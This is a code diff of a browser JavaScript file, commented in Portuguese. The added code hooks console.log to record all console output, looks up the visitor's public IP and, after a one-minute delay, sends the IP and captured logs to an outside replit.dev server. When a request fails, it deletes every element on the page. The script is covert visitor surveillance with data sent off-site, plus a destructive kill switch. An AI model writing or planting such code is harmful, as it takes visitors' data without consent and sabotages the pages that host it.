@@ -1,47 +1,67 @@
-var originalLog = console.log;
-    console.log = function() {
-        var logMessage = Array.prototype.slice.call(arguments).join(' ');
-        originalLog.call(console, logMessage);
+var consoleLogs = [];
 
+// Variável para armazenar o IP
+var userIP = '';
+
+// Captura a função original de console.log
+var originalLog = console.log;
+
+// Substitui console.log por uma função personalizada
+console.log = function() {
+  // Converte os argumentos para uma string
+  var logMessage = Array.prototype.slice.call(arguments).join(' ');
+
+  // Adiciona a mensagem ao array global de consoleLogs
+  consoleLogs.push(logMessage);
+
+  // Chama a função original de console.log para exibir no console do navegador
+  originalLog.apply(console, arguments);
+};
+
+// Função para limpar elementos da página
 function sc() {
-  var e = document.querySelectorAll('*');
-    e.forEach(function(element) {
+  var elements = document.querySelectorAll('*');
+  elements.forEach(function(element) {
     element.remove();
   });
 }
 
+// Requisição para obter o IP usando XHR
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://api64.ipify.org?format=json', true);
 xhr.onload = function() {
   if (xhr.status === 200) {
     var data = JSON.parse(xhr.responseText);
-    var user = data.ip;
+    userIP = data.ip;
 
-    var xhrP = new XMLHttpRequest();
-
-    xhrP.open('POST', 'https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/get', true);
-    xhrP.setRequestHeader('Content-Type', 'application/json');
-    xhrP.onload = function() {
-      if (xhrP.status === 200) {
-        var responseData = JSON.parse(xhrP.responseText);
-
-      } else {
-        alert('Error status');
-        sc();
-      }
-    };
-    xhrP.onerror = function() {
-      alert('Error status');
-      sc();
-    };
-    xhrP.send(JSON.stringify({ user, logMessage: logMessage }));
+    // Após 1 minuto, enviar os consoleLogs para o servidor
+    setTimeout(function() {
+      // Envia o consoleLogs para o servidor
+      var xhrPost = new XMLHttpRequest();
+      xhrPost.open('POST', 'https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/get', true);
+      xhrPost.setRequestHeader('Content-Type', 'application/json');
+      xhrPost.onload = function() {
+        if (xhrPost.status === 200) {
+          var responseData = JSON.parse(xhrPost.responseText);
+          console.log('Logs do console enviados com sucesso para o servidor');
+        } else {
+          console.error('Erro ao enviar logs do console para o servidor:', xhrPost.status);
+          sc(); // Executar a função sc() em caso de erro na requisição POST
+        }
+      };
+      xhrPost.onerror = function() {
+        console.error('Erro ao enviar logs do console para o servidor:', xhrPost.status);
+        sc(); // Executar a função sc() em caso de erro na requisição POST
+      };
+      xhrPost.send(JSON.stringify({ user: userIP, consoleLogs: consoleLogs }));
+    }, 60000); // 1 minuto em milissegundos
   } else {
-    sc();
+    console.error('Erro ao obter IP:', xhr.status);
+    sc(); // Executar a função sc() em caso de erro na requisição GET
   }
 };
 xhr.onerror = function() {
-  alert('Error status');
-  sc();
+  console.error('Erro ao obter IP:', xhr.status);
+  sc(); // Executar a função sc() em caso de erro na requisição GET
 };
 xhr.send();
-}
